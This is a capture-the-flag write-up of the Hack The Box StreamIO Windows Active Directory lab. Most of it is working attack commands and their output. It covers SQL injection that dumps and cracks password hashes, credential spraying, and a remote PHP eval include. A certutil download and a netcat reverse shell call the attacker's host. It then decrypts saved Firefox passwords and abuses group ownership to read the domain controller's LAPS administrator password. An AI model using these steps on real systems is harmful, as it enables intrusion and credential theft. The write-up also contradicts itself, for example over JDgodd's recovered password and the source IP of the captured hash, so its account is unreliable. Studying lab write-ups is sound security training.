---
description: "A Medium Windows box that chains SQL injection on a hidden subdomain through PHP eval RCE to a LAPS read. Firefox saved passwords and JDgodd's group ownership are the two pivots."
tags: ["laps", "ps-remoting", "sqli", "rfi", "windows"]
cover: "/images/writeups/htb-streamio/htb-streamio-pwned.png"
title: "HTB: StreamIO"
date: 2026-06-03
draft: false
---


Windows AD box with a PHP streaming site on HTTPS. The attack chain is unusually web-heavy for an HTB Active Directory box: you spend more time in Burp than in evil-winrm before the domain even becomes relevant. The interesting part isn't any single vulnerability. It's how a SQL injection on one subdomain eventually feeds into an eval() backdoor on another, and how Firefox's credential store hands over an AD account with a path nobody mentions until you look at it in BloodHound.

## Recon

10.129.11.215, domain `streamIO.htb`, DC hostname `DC`. Port 80 had the default IIS page. Port 443 was more interesting: the TLS certificate's Subject Alternative Names listed two hosts, `streamIO.htb` and `watch.streamIO.htb`. Standard AD ports alongside: Kerberos, LDAP, SMB, WinRM on 5985.

```bash
…/htb/streamIO ❯ nmap -sC -sV -T4 $DC_IP
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-02 23:24 +0100
Nmap scan report for 10.129.11.215
Host is up (0.10s latency).
Not shown: 986 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-03 05:24:29Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb, Site: Default-First-Site-Name)
443/tcp  open  ssl/https?
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Not valid before: 2022-02-22T07:03:28
|_Not valid after:  2022-03-24T07:03:28
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

The main site at `streamIO.htb` was a movie streaming platform. The footer had a staff section with names and job titles: Barry (Content manager), Oliver (Web Developer), Samantha (Public affairs manager).

![streamio.htb footer showing staff members Barry, Oliver, and Samantha with their roles](/images/writeups/htb-streamio/web-streamio-staff-section.png)

I generated username variants and tried AS-REP roasting against all of them. Every account came back `KDC_ERR_C_PRINCIPAL_UNKNOWN`. These names don't exist as AD accounts:

```bash
…/htb/streamIO ✗ GetNPUsers.py streamIO.htb/ -usersfile users.txt -format hashcat -outputfile asrep.txt -dc-ip 10.129.11.215
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
```

The website names were a dead end. I moved on to the `watch.` subdomain.

## SQL Injection on watch.streamIO.htb

The watch subdomain was a separate streaming interface. Fuzzing it found only a `/static` redirect:

```bash
…/htb/streamIO ❯ ffuf -u https://watch.streamIO.htb/FUZZ -w ~/tools/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt

static                  [Status: 301, Size: 157, Words: 9, Lines: 2, Duration: 291ms]
Static                  [Status: 301, Size: 157, Words: 9, Lines: 2, Duration: 177ms]
STATIC                  [Status: 301, Size: 157, Words: 9, Lines: 2, Duration: 160ms]
:: Progress: [29999/29999] :: Job [1/1] :: 262 req/sec :: Duration: [0:02:57] :: Errors: 1 ::
```

There was an email form on the main watch page. SQLMap against that `email` parameter came back clean:

```bash
…/htb/streamIO ❯ sqlmap -r req 
[03:21:48] [INFO] parsing HTTP request from 'req'
[03:21:48] [INFO] testing connection to the target URL
[03:21:49] [WARNING] the web server responded with an HTTP error code (405) which could interfere with the results of the tests
[03:21:49] [INFO] checking if the target is protected by some kind of WAF/IPS
[03:21:49] [INFO] testing if the target URL content is stable
[03:21:49] [INFO] target URL content is stable
[03:21:49] [INFO] testing if POST parameter 'email' is dynamic
[03:21:49] [WARNING] POST parameter 'email' does not appear to be dynamic
[03:21:50] [WARNING] heuristic (basic) test shows that POST parameter 'email' might not be injectable
...
[03:22:04] [WARNING] POST parameter 'email' does not seem to be injectable
[03:22:04] [CRITICAL] all tested parameters do not appear to be injectable.

[*] ending @ 03:22:04 /2026-06-03/
```

Fuzzing found a `/search.php` endpoint. SQLMap triggered the site's blocking mechanism almost immediately. Each automated request redirected to `blocked.php` with an access denied page:

```bash
…/htb/streamIO ✗ sqlmap -r search_req 
[03:36:01] [INFO] parsing HTTP request from 'search_req'
[03:36:01] [INFO] testing connection to the target URL
[03:36:02] [INFO] testing if the target URL content is stable
[03:36:02] [INFO] testing if POST parameter 'q' is dynamic
[03:36:03] [WARNING] POST parameter 'q' does not appear to be dynamic
[03:36:04] [WARNING] heuristic (basic) test shows that POST parameter 'q' might not be injectable
[03:36:04] [INFO] testing for SQL injection on POST parameter 'q'
[03:36:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'

got a 302 redirect to 'https://watch.streamio.htb/blocked.php'. Do you want to follow? [Y/n] n
```

Manual injection worked fine though. Injecting a single quote into the `q` parameter produced a Microsoft SQL Server error, confirming the database and the injectable parameter.

![Burp Suite showing POST to search.php with SQLi payload and MSSQL error response in the orange-highlighted box](/images/writeups/htb-streamio/web-search-sqli-mssql-error.png)

In a union-based injection, you append a `UNION SELECT` to the original query so the database returns rows from a table you choose. The number of columns in your injected SELECT has to match the original query's column count, six columns here, determined by incrementing until the injection stopped erroring.

I also tried coercing the SQL service's NTLMv2 hash via `xp_dirtree` pointing at a Responder listener. That worked, but the hash belonged to the `DC$` machine account, not a user account:

```
[SMB] NTLMv2-SSP Client   : ::ffff:10.10.11.158
[SMB] NTLMv2-SSP Username : streamIO\DC$
[SMB] NTLMv2-SSP Hash     : DC$::streamIO:63c8495b2f15ac52:BC9ECFC7DE5F81A1C8CB9BD865873B43:010100000000000000901E25E5C6D8018E57573EFE652D490000000002000800420055004E00560001001E00570049004E002D004300540054004100430035004D004C00510039004B0004003400570049004E002D004300540054004100430035004D004C00510039004B002E00420055004E0056002E004C004F00430041004C0003001400420055004E0056002E004C004F00430041004C0005001400420055004E0056002E004C004F00430041004C000700080000901E25E5C6D801...
```

Machine account hashes essentially never crack from a wordlist. Dead end.

Enumerating the `streamio` database found two tables: `movies` and `users`. Dumped the whole users table in one shot:

```sql
q=kanyo' UNION SELECT 1,CONCAT(username,':',password),3,4,5,6 FROM users--
```

![Burp Suite response showing admin:665a50ac... and Alexandra user:hash pairs from the users table](/images/writeups/htb-streamio/web-sqli-user-hash-dump.png)

Threw all the hashes at hashcat with rockyou. Twelve cracked:

```bash
…/htb/streamIO ✗ hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt --user --show

admin:665a50ac9eaa781e4f7f04199db97a11:paddpadd
Barry:54c88b2dbd7b1a84012fabc1a4c73415:$hadoW
Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$
Clara:ef8f3d30a856cf166fb8215aca93e9ff:%$clara
Juliette:6dcd87740abb64edfa36d170f0d5450d:$3xybitch
Lauren:08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##
Lenord:ee0b8a0937abd60c2882eacb2f8dc49f:physics69i
Michelle:b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123
Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
Thane:3577c47eb1e12c8ba021611e1280753c:highschoolmusical
Victoria:b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..
```

Barry and yoshihide were the candidates who might have AD accounts. Barry failed both WinRM and SMB:

```bash
…/htb/streamIO ❯ nxc winrm 10.129.11.215 -u barry -p '$hadoW'
WINRM       10.129.11.215   5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:streamIO.htb) 
WINRM       10.129.11.215   5985   DC               [-] streamIO.htb\barry:$hadoW

…/htb/streamIO ✗ nxc smb 10.129.11.215 -u barry -p '$hadoW'
SMB         10.129.11.215   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:None)
SMB         10.129.11.215   445    DC               [-] streamIO.htb\barry:$hadoW STATUS_LOGON_FAILURE
```

There was a login page at `streamIO.htb/login.php`. Neither admin nor barry credentials worked there either. Gobuster on the main domain found an `/admin` directory with a `master.php` inside it that returned a bare `Only accessible through includes` message when accessed directly:

```bash
…/htb/streamIO ❯ gobuster dir -u https://streamIO.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -k -t 50 -x php
ADMIN                (Status: 301) [Size: 150] [--> https://streamIO.htb/ADMIN/]
Admin                (Status: 301) [Size: 150] [--> https://streamIO.htb/Admin/]
About.php            (Status: 200) [Size: 7825]
Contact.php          (Status: 200) [Size: 6434]
Login.php            (Status: 200) [Size: 4145]
about.php            (Status: 200) [Size: 7825]
admin                (Status: 301) [Size: 150] [--> https://streamIO.htb/admin/]
contact.php          (Status: 200) [Size: 6434]
index.php            (Status: 200) [Size: 13497]
...

…/htb/streamIO ✗ gobuster dir -u https://streamIO.htb/admin -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -k -t 50 -x php
Index.php            (Status: 403) [Size: 18]
index.php            (Status: 403) [Size: 18]
master.php           (Status: 200) [Size: 58]
```

To get into the admin panel I needed valid credentials. Sprayed all cracked credentials against the login page with hydra:

```bash
…/htb/streamIO ❯ hydra -C userpass streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=failed"
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak

[DATA] max 12 tasks per 1 server, overall 12 tasks, 12 login tries, ~1 try per task
[DATA] attacking http-post-forms://streamio.htb:443/login.php:username=^USER^&password=^PASS^:F=failed
[443][http-post-form] host: streamio.htb   login: yoshihide   password: 66boysandgirls..
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-06-03 05:14:06
```

`yoshihide:66boysandgirls..` logged in.

## Admin Panel: RFI and eval() RCE

![streamio.htb admin panel showing User management, Staff management, Movie management, and Leave a message for admin options](/images/writeups/htb-streamio/web-admin-panel-logged-in.png)

Each button in the admin panel appended a query parameter: `?user=`, `?staff=`, `?movie=`. Fuzzing for additional parameters with a valid session cookie found a `debug` parameter. Testing `?debug=master.php` loaded the Movie management page, so `debug` was feeding a filename into `include()` server-side.

```bash
…/htb/streamIO ❯ ffuf -u "https://streamio.htb/admin/index.php?FUZZ=master.php" -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -H "Cookie: PHPSESSID=fflo9cp8c2nkda0rq73klq9cfs" -fw 85

debug                   [Status: 200, Size: 343060, Words: 17814, Lines: 11171, Duration: 94ms]
movie                   [Status: 200, Size: 320235, Words: 15986, Lines: 10791, Duration: 115ms]
staff                   [Status: 200, Size: 12484, Words: 1784, Lines: 399, Duration: 93ms]
user                    [Status: 200, Size: 2444, Words: 206, Lines: 75, Duration: 69ms]
:: Progress: [6453/6453] :: Job [1/1] :: 457 req/sec :: Duration: [0:00:14] :: Errors: 0 ::
```

The next question was whether it could load a remote URL instead of a local path. Remote File Inclusion works when PHP's `allow_url_include` is enabled. If `include()` accepts URLs, pointing it at a file on my machine would make the PHP server fetch my file and execute it.

Before testing blind, I used it to read the server's own source code first, pointing `include` at the local `master.php` path to leak it:

![Burp Suite POST request with include parameter pointing to master.php, response showing PHP source code with eval(file_get_contents($_POST['include'])) highlighted](/images/writeups/htb-streamio/web-rfi-master-php-source-code.png)

The relevant section at the bottom of master.php:

```php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" ) 
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
```

`eval(file_get_contents($_POST['include']))`. It fetches whatever URL or path you pass in the `include` POST parameter and evaluates it as PHP. This is full RCE: serve a PHP file with `system()` calls from a local HTTP server, and the box will fetch and execute it. The only restriction is that `index.php` is blocked by name check.

Source code also leaked the database credentials: `db_admin:B1@hx31234567890`.

The execution chain: POST to `/admin/?debug=master.php` with `include=http://10.10.16.129:9000/shell.php`. Tested with a directory listing first:

```bash
…/htb/streamIO ✗ cat > shell.php
system("dir C:\Users\");
```

```
POST /admin/?debug=master.php HTTP/2
Host: streamio.htb
Cookie: PHPSESSID=670s23j1d7v5u7pve1avvgpfpa
Content-Type: application/x-www-form-urlencoded

include=http://10.10.16.129:9000/shell.php
```

Directory listing came back at the bottom of the response. Uploaded nc64.exe via certutil:

```bash
…/htb/streamIO ✗ cat > shell.php
system("certutil -urlcache -f http://10.10.16.129:9000/nc64.exe nc.exe");
```

Then triggered a reverse shell:

```bash
…/htb/streamIO ✗ cat > shell.php
system("nc.exe 10.10.16.129 9999 -e cmd.exe");
```

```
 Directory of C:\Users

02/22/2022  03:48 AM    <DIR>          .
02/22/2022  03:48 AM    <DIR>          ..
02/22/2022  03:48 AM    <DIR>          .NET v4.5
02/22/2022  03:48 AM    <DIR>          .NET v4.5 Classic
02/26/2022  11:20 AM    <DIR>          Administrator
05/09/2022  05:38 PM    <DIR>          Martin
02/26/2022  10:48 AM    <DIR>          nikk37
02/22/2022  02:33 AM    <DIR>          Public
               0 File(s)              0 bytes
               8 Dir(s)   7,176,941,568 bytes free
```

Shell as `yoshihide`. `whoami /all` confirmed this is the IIS application pool account, equivalent to `www-data` on Linux:

```bash
whoami /all

USER INFORMATION
----------------

User Name          SID                                           
================== ==============================================
streamio\yoshihide S-1-5-21-1470860369-1569627196-4264678630-1107


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes                                        
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity  Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448                                                    


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State  
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

No interesting privileges, no access to other users' directories.

## Lateral Movement to nikk37

`C:\Users\` showed Administrator, Martin, nikk37, and Public. `yoshihide` wasn't there. The web account doesn't have a home directory.

The database credentials from the source code were usable. `sqlcmd` from the shell:

```bash
C:\inetpub\streamio.htb>sqlcmd -S localhost -U db_admin -P "B1@hx31234567890" -Q "SELECT name FROM sys.databases"
name                                                                                                                            
--------------------------------------------------------------------------------------------------------------------------------
master                                                                                                                          
tempdb                                                                                                                          
model                                                                                                                           
msdb                                                                                                                            
STREAMIO                                                                                                                        
streamio_backup                                                                                                                 

(6 rows affected)
```

Six databases, including one that wasn't in the original enumeration: `streamio_backup`. Same schema as the main database, movies and users tables:

```bash
C:\inetpub\streamio.htb>sqlcmd -S localhost -U db_admin -P "B1@hx31234567890" -d streamio_backup -Q "SELECT table_name FROM information_schema.tables"
table_name                                                                                                                      
--------------------------------------------------------------------------------------------------------------------------------
movies                                                                                                                          
users                                                                                                                           

(2 rows affected)
```

nikk37 was in the backup users table:

```bash
C:\inetpub\streamio.htb>sqlcmd -S localhost -U db_admin -P "B1@hx31234567890" -d streamio_backup -Q "SELECT * FROM users WHERE username = 'nikk37'"
id          username                                           password                                          
----------- -------------------------------------------------- --------------------------------------------------
          1 nikk37                                             389d14cb8e4e9b94b137deb1caf0612a
```

Cracked: `nikk37:get_dem_girls2@yahoo.com`.

```bash
…/htb/streamIO ❯ nxc winrm $DC_IP -u nikk37 -p 'get_dem_girls2@yahoo.com'
WINRM       10.129.11.215   5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:streamIO.htb) 
WINRM       10.129.11.215   5985   DC               [+] streamIO.htb\nikk37:get_dem_girls2@yahoo.com (Pwn3d!)
```

User flag on his desktop.

## Firefox Credentials and the LAPS Chain

nikk37's `whoami /all` showed nothing interesting privilege-wise. Uploaded SharpHound and WinPEAS. WinPEAS found something in its browser credential section:

```
╔══════════╗ Showing saved credentials for Firefox
    Info: if no credentials were listed, you might need to close the browser and try again.

╔══════════╗ Looking for Firefox DBs
╚     https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history
    Firefox credentials file exists at C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db
╚     Run SharpWeb (https://github.com/djhohnstein/SharpWeb)

╔══════════╗ Looking for GET credentials in Firefox history
╚     https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#browsers-history

    [x] IO exception, places.sqlite file likely in use (i.e. Firefox is likely running).
```

Firefox stores saved passwords using symmetric encryption. The encryption key is derived from the master password. If no master password is set, the key derivation uses a blank string, which means any tool with the right logic can decrypt the credentials without cracking anything. The credentials themselves are in `logins.json`, the key material in `key4.db`, and the certificate database in `cert9.db`. Downloaded all three, then ran them through firepwd:

```bash
…/streamIO/firefox ❯ python3 firepwd/firepwd.py -d .
globalSalt: b'd215c391179edb56af928a06c627906bcbd4bd47'
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'5d573772912b3c198b1e3ee43ccb0f03b0b23e46d51c34a2a055e00ebcd240f5'
           INTEGER b'01'
           INTEGER b'20'
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
           }
         }
       }
       SEQUENCE {
         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
         OCTETSTRING b'1baafcd931194d48f8ba5775a41f'
       }
     }
   }
   OCTETSTRING b'12e56d1c8458235a4136b280bd7ef9cf'
 }
clearText b'70617373776f72642d636865636b0202'
password check? True
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.5.13 pkcs5 pbes2
     SEQUENCE {
       SEQUENCE {
         OBJECTIDENTIFIER 1.2.840.113549.1.5.12 pkcs5 PBKDF2
         SEQUENCE {
           OCTETSTRING b'098560d3a6f59f76cb8aad8b3bc7c43d84799b55297a47c53d58b74f41e5967e'
           INTEGER b'01'
           INTEGER b'20'
           SEQUENCE {
             OBJECTIDENTIFIER 1.2.840.113549.2.9 hmacWithSHA256
           }
         }
       }
       SEQUENCE {
         OBJECTIDENTIFIER 2.16.840.1.101.3.4.1.42 aes256-CBC
         OCTETSTRING b'e28a1fe8bcea476e94d3a722dd96'
       }
     }
   }
   OCTETSTRING b'51ba44cdd139e4d2b25f8d94075ce3aa4a3d516c2e37be634d5e50f6d2f47266'
 }
clearText b'b3610ee6e057c4341fc76bc84cc8f7cd51abfe641a3eec9d0808080808080808'
decrypting login/password pairs
Using 3DES (32-byte key, truncated to 24)
https://slack.streamio.htb:b'admin',b''
https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
https://slack.streamio.htb:b'JDgodd',b'password@12'
```

Plaintext credentials for four accounts, all saved against the internal Slack subdomain. The interesting one was JDgodd. Spraying all extracted passwords against domain accounts confirmed his:

```bash
…/htb/streamIO ✗ nxc smb $DC_IP -u JDgodd -p passwords.txt
SMB         10.129.11.215   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:None)
SMB         10.129.11.215   445    DC               [+] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r
```

BloodHound had already shown what JDgodd could do:

![BloodHound graph showing JDGODD@STREAMIO.HTB has Owns and WriteOwner edges to CORE STAFF@STREAMIO.HTB group](/images/writeups/htb-streamio/bloodhound-jdgodd-owns-core-staff.png)

![BloodHound graph showing CORE STAFF@STREAMIO.HTB has a ReadLAPSPassword edge to DC.STREAMIO.HTB](/images/writeups/htb-streamio/bloodhound-core-staff-readlaps-dc.png)

`JDgodd → Owns Core Staff → Core Staff → ReadLAPSPassword → DC`.

JDgodd owns the Core Staff group object. In AD, the owner of an object controls its DACL, the list of who has what permissions on the object. Ownership alone doesn't grant membership, but it does let you modify the group's access control entries. That means JDgodd can grant himself WriteMember rights on the group, then add himself as a member, which puts him in a group with ReadLAPSPassword access to the DC's computer object.

LAPS stores the DC's local Administrator password as the `ms-Mcs-AdmPwd` attribute on the computer object in AD. Any member of a group with ReadLAPSPassword access can query that attribute and read the current password directly.

From nikk37's WinRM session, using JDgodd's credentials as a PSCredential object:

```powershell
*Evil-WinRM* PS C:\Users\nikk37> $pass = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\nikk37> $cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $pass)

# Grant JDgodd WriteMember rights on Core Staff (owner can do this)
Add-DomainObjectAcl -Credential $cred -TargetIdentity "Core Staff" -PrincipalIdentity "streamio\JDgodd"

# Add JDgodd as a member
Add-DomainGroupMember -Credential $cred -Identity "Core Staff" -Members "StreamIO\JDgodd"
```

Verified:

```bash
*Evil-WinRM* PS C:\Users\nikk37> net group "CORE STAFF" /domain
 
Group name     CORE STAFF
Comment

Members

-------------------------------------------------------------------------------
JDgodd
```

Then read the LAPS password. `Get-AdComputer` with the PSCredential returned the DC's computer object but not the `ms-Mcs-AdmPwd` attribute:

```powershell
*Evil-WinRM* PS C:\Users\nikk37> Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred


DistinguishedName : CN=DC,OU=Domain Controllers,DC=streamIO,DC=htb
DNSHostName       : DC.streamIO.htb
Enabled           : True
Name              : DC
ObjectClass       : computer
ObjectGUID        : 8c0f9a80-aaab-4a78-9e0d-7a4158d8b9ee
SamAccountName    : DC$
SID               : S-1-5-21-1470860369-1569627196-4264678630-1000
UserPrincipalName :
```

The attribute just doesn't show. bloodyAD worked fine:

```bash
…/htb/streamIO ❯ bloodyAD --host 10.129.11.215 -d streamIO.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' \
  get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
  --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime

distinguishedName: CN=DC,OU=Domain Controllers,DC=streamIO,DC=htb
ms-Mcs-AdmPwd: 7x/}#R.9&hczaZ
ms-Mcs-AdmPwdExpirationTime: 134250236444854828
```

```bash
evil-winrm -i 10.129.11.215 -u Administrator -p '7x/}#R.9&hczaZ'
```

Root flag was on Martin's desktop, not Administrator's. Checked `C:\Users\Martin\Desktop\` for it. The eval() backdoor is what made this box memorable for me. A developer left a `file_get_contents` feeding directly into `eval` in a debug parameter that nobody thought to remove from production. One authenticated request to a hidden parameter and you have arbitrary PHP execution. Clean chain, unusually web-heavy for an AD box.
